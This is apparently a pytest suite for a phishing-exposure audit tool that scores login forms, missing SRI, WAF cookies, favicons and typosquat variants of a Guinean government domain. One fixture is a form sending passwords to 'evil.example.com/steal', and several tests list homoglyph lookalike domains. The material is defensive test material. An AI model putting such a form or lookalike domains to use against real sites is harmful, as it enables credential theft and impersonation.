"""
tests/test_phishing_surface.py
Mocke httpx via respx pour tous les tests Sprint 3 + 4.
"""
from __future__ import annotations

import json
from pathlib import Path

import httpx
import pytest
import respx

from schemas.finding import Finding
from tools import phishing_surface as ps

URL = "https://127.0.0.1"
HOST = "127.0.0.1"


@pytest.fixture(autouse=True)
def _stub_is_restricted(monkeypatch):
    """Bypass the multi-source TLDVerifier for all phishing tests.

    Mirrors the ground truth confirmed live :
      .gov.gn  → RESTRICTED
      .gouv.gn → RESTRICTED
      .gn      → FREE
    Anything else (test-only TLDs like .0.1 from 127.0.0.1) → not restricted
    so we never hit the real IANA / WhoisFreaks / dig endpoints.
    """
    restricted = {"gov.gn", "gouv.gn"}

    def fake(tld):
        return tld.lstrip(".").lower() in restricted

    monkeypatch.setattr(ps, "_is_restricted", fake)
    # Reset the lazy verifier singleton so a follow-up integration run
    # (different process) is not influenced by test state.
    monkeypatch.setattr(ps, "_TLD_VERIFIER", None)

LOGIN_HTML_POST = """
<html><body>
  <form id="loginform" method="POST" action="/auth/submit">
    <input name="username" type="text" id="user">
    <input name="password" type="password" id="pwd">
    <button type="submit">Sign in</button>
  </form>
</body></html>
"""

LOGIN_HTML_GET = """
<html><body>
  <form method="GET" action="/check">
    <input type="text" name="u">
    <input type="password" name="p">
  </form>
</body></html>
"""

LOGIN_HTML_EXTERNAL_ACTION = """
<html><body>
  <form method="POST" action="https://evil.example.com/steal">
    <input type="password" name="p">
  </form>
</body></html>
"""

LOGIN_HTML_WITH_ASSETS = """
<html><head>
  <script src="https://cdn.example.com/lib.js"></script>
  <script src="https://cdn.example.com/safe.js" integrity="sha384-abc"></script>
  <link rel="stylesheet" href="https://cdn.example.com/style.css">
  <link rel="stylesheet" href="/local.css">
  <img src="https://tracker.example.com/pixel.gif">
</head><body>
  <form method="POST" action="/login">
    <input type="password" name="pwd">
  </form>
</body></html>
"""

LOGIN_HTML_NO_FORM = """<html><body><h1>Welcome</h1></body></html>"""


def _mock_login_only(url_path: str, html: str, headers: dict[str, str] | None = None):
    """Reset respx and stub: 200 on `url_path`, 404 elsewhere; favicon 404."""
    respx.reset()
    respx.get(URL + url_path).mock(
        return_value=httpx.Response(200, html=html, headers=headers or {})
    )
    for path in ps.LOGIN_PATHS:
        if path == url_path:
            continue
        respx.get(URL + path).mock(return_value=httpx.Response(404))
    for path in ps.FAVICON_PATHS:
        respx.get(URL + path).mock(return_value=httpx.Response(404))


# ── Login form parser ────────────────────────────────────────────────


@respx.mock
def test_login_form_post_yields_medium_finding():
    _mock_login_only("/", LOGIN_HTML_POST)
    findings = ps.scan(URL)
    login = [f for f in findings if f.title == "Login form identified"]
    assert len(login) == 1
    assert login[0].severity == "MEDIUM"
    assert "method=POST" in login[0].finding


@respx.mock
def test_login_form_get_yields_high_finding():
    _mock_login_only("/", LOGIN_HTML_GET)
    findings = ps.scan(URL)
    high = [f for f in findings if f.title == "Login form uses GET (credentials in URL)"]
    assert len(high) == 1
    assert high[0].severity == "HIGH"


@respx.mock
def test_login_form_external_action_yields_info_finding():
    _mock_login_only("/", LOGIN_HTML_EXTERNAL_ACTION)
    findings = ps.scan(URL)
    ext = [f for f in findings if f.title == "Login form action targets external domain"]
    assert len(ext) == 1
    assert ext[0].severity == "INFO"
    assert "evil.example.com" in ext[0].finding


@respx.mock
def test_no_login_page_emits_info():
    respx.reset()
    for path in ps.LOGIN_PATHS:
        respx.get(URL + path).mock(return_value=httpx.Response(404))
    for path in ps.FAVICON_PATHS:
        respx.get(URL + path).mock(return_value=httpx.Response(404))
    findings = ps.scan(URL)
    assert any(f.title == "No login page reachable" for f in findings)


@respx.mock
def test_login_falls_back_to_connexion_path():
    """When `/` returns 200 but has no form, parser still parses it,
    but '/connexion' is skipped (we stop on the first 200)."""
    _mock_login_only("/", LOGIN_HTML_NO_FORM)
    # No password field → no Login form identified finding.
    findings = ps.scan(URL)
    assert not any(f.title == "Login form identified" for f in findings)


# ── Assets + SRI ─────────────────────────────────────────────────────


@respx.mock
def test_external_script_without_sri_is_high():
    _mock_login_only("/", LOGIN_HTML_WITH_ASSETS)
    findings = ps.scan(URL)
    titles = [f.title for f in findings]
    assert "External script without SRI" in titles
    high = [f for f in findings if f.title == "External script without SRI"]
    assert all(f.severity == "HIGH" for f in high)


@respx.mock
def test_external_script_with_sri_is_not_flagged():
    _mock_login_only("/", LOGIN_HTML_WITH_ASSETS)
    findings = ps.scan(URL)
    safe_evidence = " ".join(e for f in findings for e in f.evidence)
    assert "safe.js" not in safe_evidence, (
        "script with integrity attribute must NOT appear in any finding"
    )


@respx.mock
def test_external_stylesheet_without_sri_is_medium():
    _mock_login_only("/", LOGIN_HTML_WITH_ASSETS)
    findings = ps.scan(URL)
    css = [f for f in findings if f.title == "External stylesheet without SRI"]
    assert len(css) == 1
    assert css[0].severity == "MEDIUM"


@respx.mock
def test_assets_synthesis_sets_chain_dependency():
    _mock_login_only("/", LOGIN_HTML_WITH_ASSETS)
    findings = ps.scan(URL)
    synth = [f for f in findings if f.title.endswith("SRI-protected")]
    assert len(synth) == 1
    assert "CHAIN_DEPENDENCY" in synth[0].flags


# ── WAF detection ────────────────────────────────────────────────────


@respx.mock
def test_imperva_waf_signature_detected():
    _mock_login_only(
        "/", LOGIN_HTML_POST,
        headers={"set-cookie": "ipmsperf_uuid=abc-123; Path=/; Secure"},
    )
    findings = ps.scan(URL)
    waf = [f for f in findings if f.title == "WAF Imperva/Incapsula detected"]
    assert len(waf) == 1
    assert waf[0].severity == "INFO"
    assert "CONTEXT_DEPENDENT" in waf[0].flags


@respx.mock
def test_no_waf_when_cookie_absent():
    _mock_login_only("/", LOGIN_HTML_POST)
    findings = ps.scan(URL)
    assert not any(f.title == "WAF Imperva/Incapsula detected" for f in findings)


# ── Favicon fingerprinting ───────────────────────────────────────────


@respx.mock
def test_favicon_present_yields_info_with_hash():
    respx.reset()
    respx.get(URL + "/").mock(return_value=httpx.Response(200, html=LOGIN_HTML_POST))
    for p in ps.LOGIN_PATHS:
        if p == "/":
            continue
        respx.get(URL + p).mock(return_value=httpx.Response(404))
    favicon_bytes = b"\x00\x01\x02BINARY-FAVICON-CONTENT"
    respx.get(URL + "/favicon.ico").mock(
        return_value=httpx.Response(200, content=favicon_bytes)
    )
    respx.get(URL + "/favicon.png").mock(return_value=httpx.Response(404))
    findings = ps.scan(URL)
    fav = [f for f in findings if "Favicon accessible" in f.title]
    assert len(fav) == 1
    assert fav[0].severity == "INFO"
    # SHA256 of the content must appear in evidence.
    import hashlib
    expected = hashlib.sha256(favicon_bytes).hexdigest()
    assert any(expected in e for e in fav[0].evidence)


@respx.mock
def test_favicon_404_yields_info_absent():
    _mock_login_only("/", LOGIN_HTML_POST)
    findings = ps.scan(URL)
    absent = [f for f in findings if f.title == "Favicon absent"]
    assert len(absent) == 1
    assert absent[0].severity == "INFO"


# ── Typosquat generator ──────────────────────────────────────────────


def test_typosquat_generates_filtered_variants_for_telemo():
    """With .gov.gn and .gouv.gn marked Restricted (autouse fixture), we
    expect ~6 variants on the free .gn TLD: 3 homoglyphs + 2 merged-hyphen
    + 1 level-strip. No variant should remain on a restricted TLD."""
    variants = ps.generate_typosquats("telemo.gov.gn")
    domains = {v for v, _ in variants}

    assert 5 <= len(variants) <= ps.MAX_TYPOSQUATS
    # No variants on the restricted TLDs.
    assert not any(d.endswith(".gov.gn") for d in domains), \
        "no variant should remain on .gov.gn (Restricted Domain)"
    assert not any(".gouv.gn" in d for d in domains), \
        "no variant should remain on .gouv.gn (Restricted Domain)"

    # Level-strip variant.
    assert "telemo.gn" in domains, "expected the level-strip variant telemo.gn"
    # Merged-hyphen variants.
    assert "telemo-gov.gn" in domains, "expected merged-hyphen variant telemo-gov.gn"
    assert "telemo-gouv.gn" in domains, "expected merged-hyphen variant telemo-gouv.gn"
    # At least one homoglyph on .gn (e.g. t3lemo.gn / te1emo.gn / telem0.gn).
    assert any(
        d.endswith(".gn") and d != "telemo.gn" and not d.startswith("telemo-")
        for d in domains
    ), "expected at least one homoglyph variant on .gn"


def test_typosquat_homoglyph_substitutions():
    variants = ps.generate_typosquats("telemo.gov.gn")
    rules = " ".join(rule for _, rule in variants)
    assert "homoglyph" in rules


def test_typosquat_excludes_restricted_tlds(monkeypatch):
    """Mock _is_restricted → True for .gov.gn, .gouv.gn — assert no variant
    ends on those TLDs and the .gn variants are still emitted."""
    restricted = {"gov.gn", "gouv.gn"}
    monkeypatch.setattr(
        ps, "_is_restricted",
        lambda tld: tld.lstrip(".").lower() in restricted,
    )

    variants = ps.generate_typosquats("telemo.gov.gn")
    domains = {v for v, _ in variants}
    assert not any(".gov.gn" in d for d in domains)
    assert not any(".gouv.gn" in d for d in domains)
    assert all(d.endswith(".gn") for d in domains)
    # The free-TLD essentials are still there.
    assert {"telemo.gn", "telemo-gov.gn", "telemo-gouv.gn"} <= domains


def test_typosquat_keeps_variants_when_tld_not_restricted(monkeypatch):
    """Positive control: when the verifier says the intermediate TLD is
    registrable, we DO emit variants on it (homoglyph + hyphen + prefix/
    suffix)."""
    monkeypatch.setattr(ps, "_is_restricted", lambda tld: False)
    variants = ps.generate_typosquats("acme.co.uk")
    domains = {v for v, _ in variants}
    # Some variant on the non-restricted intermediate TLD must survive.
    assert any(d.endswith(".co.uk") and d != "acme.co.uk" for d in domains)


def test_typosquat_synthesis_text_mentions_restricted_tlds():
    """Synthesis finding must explain why .gov.gn / .gouv.gn variants were
    excluded so the auditor doesn't think the generator is broken."""
    findings = ps.typosquat_findings("https://telemo.gov.gn")
    crit = [f for f in findings if f.severity == "CRITICAL"]
    assert len(crit) == 1
    assert "Restricted" in crit[0].finding
    assert ".gov.gn" in crit[0].finding or ".gouv.gn" in crit[0].finding


def test_typosquat_no_duplicates_and_skips_self():
    variants = ps.generate_typosquats("telemo.gov.gn")
    domains = [v for v, _ in variants]
    assert len(domains) == len(set(domains)), "duplicate variants generated"
    assert "telemo.gov.gn" not in domains, "must not echo the original domain"


def test_typosquat_synthesis_finding_is_critical():
    findings = ps.typosquat_findings("https://telemo.gov.gn")
    crit = [f for f in findings if f.severity == "CRITICAL"]
    assert len(crit) == 1
    assert "PHISHING_VECTOR" in crit[0].flags
    assert "CHAIN_DEPENDENCY" in crit[0].flags
    # Sprint number must be 4 (synthesis is Sprint 4 per CLAUDE.md §9).
    assert crit[0].sprint == 4


def test_typosquat_per_variant_findings_are_high_phishing_vector():
    findings = ps.typosquat_findings("https://telemo.gov.gn")
    per_variant = [f for f in findings if f.title.startswith("Typosquat domain variant")]
    assert per_variant
    for f in per_variant:
        assert f.severity == "HIGH"
        assert "PHISHING_VECTOR" in f.flags
        assert f.sprint == 4


# ── Scope guard + JSON RT ────────────────────────────────────────────


def test_scan_out_of_scope_raises_before_any_get():
    """Scope guard must trigger BEFORE httpx is touched. respx is unset, so
    if the scan reached httpx it would either hit the network or fail
    differently — ValueError proves scope_check ran first."""
    with pytest.raises(ValueError, match="not in authorized scope"):
        ps.scan("https://evil.example.com")


@respx.mock
def test_findings_json_roundtrip(tmp_path: Path):
    _mock_login_only("/", LOGIN_HTML_WITH_ASSETS)
    findings = ps.scan(URL)
    assert findings
    out = tmp_path / "phishing.json"
    ps.write_findings(findings, out)
    raw = json.loads(out.read_text(encoding="utf-8"))
    restored = [Finding.model_validate(item) for item in raw]
    assert all(f.tool == "phishing-surface" for f in restored)
    # Sprint 3 findings exist (login form, assets) and Sprint 4 findings exist (typosquats).
    sprints = {f.sprint for f in restored}
    assert sprints >= {3, 4}
